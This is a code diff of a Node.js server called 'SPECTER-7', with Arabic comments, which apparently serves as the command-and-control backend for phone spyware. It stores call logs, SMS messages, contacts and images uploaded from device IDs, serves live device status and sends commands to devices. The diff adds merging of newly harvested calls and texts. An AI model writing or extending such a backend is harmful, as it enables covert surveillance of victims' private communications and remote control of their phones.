@@ -21,10 +21,12 @@ if (!fs.existsSync(devicesFile)) {
     fs.writeFileSync(devicesFile, '[]');
 }
 
+// ============ استقبال البيانات ============
 app.post('/upload.php', (req, res) => {
     try {
         const data = req.body;
         
+        // حفظ الصور المنفصلة
         if (data.type === 'image_data' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -44,6 +46,7 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, images_count: imagesData.length });
         }
         
+        // ============ البيانات العادية ============
         const deviceId = data.device_id || 'unknown';
         const deviceDir = path.join(dataDir, deviceId);
         if (!fs.existsSync(deviceDir)) {
@@ -55,7 +58,19 @@ app.post('/upload.php', (req, res) => {
         let existingData = {};
         if (fs.existsSync(dataFilePath)) existingData = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
         
-        if (data.type === 'all' && data.data) {
+        // ✅ بيانات جديدة فقط — دمج فوق القديمة
+        if (data.type === 'new_data' && data.data) {
+            if (data.data.call_logs && data.data.call_logs.length > 0) {
+                if (!existingData.call_logs) existingData.call_logs = [];
+                existingData.call_logs = [...data.data.call_logs, ...existingData.call_logs];
+            }
+            if (data.data.sms && data.data.sms.length > 0) {
+                if (!existingData.sms) existingData.sms = [];
+                existingData.sms = [...data.data.sms, ...existingData.sms];
+            }
+        }
+        // ✅ أول مرة — استبدال كامل
+        else if (data.type === 'all' && data.data) {
             if (data.data.call_logs) existingData.call_logs = data.data.call_logs;
             if (data.data.sms) existingData.sms = data.data.sms;
             if (data.data.contacts) existingData.contacts = data.data.contacts;
@@ -67,6 +82,7 @@ app.post('/upload.php', (req, res) => {
         
         fs.writeFileSync(dataFilePath, JSON.stringify(existingData, null, 2));
         
+        // تحديث اسم الجهاز
         const deviceInfo = data.data && data.data.device_info ? data.data.device_info : null;
         updateDevicesList(deviceId, deviceInfo);
         
@@ -76,6 +92,7 @@ app.post('/upload.php', (req, res) => {
     }
 });
 
+// ============ استقبال الحالة الحية ============
 app.post('/live_update.php', (req, res) => {
     try {
         const data = req.body;
@@ -100,6 +117,7 @@ app.post('/live_update.php', (req, res) => {
     }
 });
 
+// ============ الحصول على البيانات الحية ============
 app.get('/live.php', (req, res) => {
     try {
         const deviceId = req.query.device;
@@ -133,6 +151,7 @@ app.get('/live.php', (req, res) => {
     }
 });
 
+// ============ API Routes ============
 app.get('/api.php', (req, res) => {
     try {
         const action = req.query.action;
@@ -180,6 +199,7 @@ app.get('/api.php', (req, res) => {
     }
 });
 
+// ============ إرسال أمر ============
 app.post('/api.php', (req, res) => {
     try {
         const { device, command } = req.body;
@@ -199,6 +219,7 @@ app.post('/api.php', (req, res) => {
     }
 });
 
+// ============ قائمة الأجهزة ============
 app.get('/devices.json', (req, res) => {
     try {
         res.json(JSON.parse(fs.readFileSync(devicesFile, 'utf8')));
@@ -207,6 +228,7 @@ app.get('/devices.json', (req, res) => {
     }
 });
 
+// ============ Helper ============
 function updateDevicesList(deviceId, deviceInfo) {
     let devices = [];
     if (fs.existsSync(devicesFile)) devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
@@ -228,4 +250,5 @@ function updateDevicesList(deviceId, deviceInfo) {
     fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
 }
 
+// ============ Start Server ============
 app.listen(PORT, () => console.log(`SPECTER-7 running on ${PORT}`));
